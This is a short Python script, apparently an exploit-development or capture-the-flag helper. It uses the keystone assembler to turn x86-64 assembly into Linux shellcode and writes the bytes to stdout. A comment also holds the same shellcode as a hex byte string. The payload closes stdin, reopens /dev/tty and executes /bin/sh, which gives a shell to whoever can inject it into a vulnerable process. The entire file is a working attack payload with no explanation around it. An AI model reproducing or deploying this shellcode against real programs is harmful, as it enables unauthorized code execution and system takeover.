#!/usr/bin/python3
import sys
import keystone

'''
    Example shellcode:

    \x90\x90\x90\x90\x48\x81\xC4\x00\x01\x00\x00\x48\x31\xFF\x6A\x03\x58\x0F\x05\x48\xBB\x2F\x64\x65\x76\x2F\x74\x74\x79\x57\x53\x54\x5F\x68\x02\x27\x00\x00\x5E\x48\x31\xD2\x6A\x02\x58\x0F\x05\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x54\x5F\x6A\x3B\x58\x0F\x05
'''

shellcode = \
'''
    add    rsp, 0x100
    xor    rdi, rdi
    push   0x3
    pop    rax
    syscall                         // close(0)
    movabs rbx, 0x7974742f7665642f
    push   rdi
    push   rbx
    push   rsp
    pop    rdi
    push   0x2702
    pop    rsi
    xor    rdx, rdx
    push   0x2
    pop    rax
    syscall                         // open("/dev/tty", O_RDWR|O_NOCTTY|O_TRUNC|O_APPEND|O_ASYNC)
    xor    rsi, rsi
    movabs rbx, 0x68732f2f6e69622f
    push   rsi
    push   rbx
    push   rsp
    pop    rdi
    push   0x3b
    pop    rax
    syscall                         // execve("/bin/sh", NULL, 0)
'''

ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)
shellcode, _ = ks.asm(shellcode)
sys.stdout.buffer.write(bytes(shellcode))
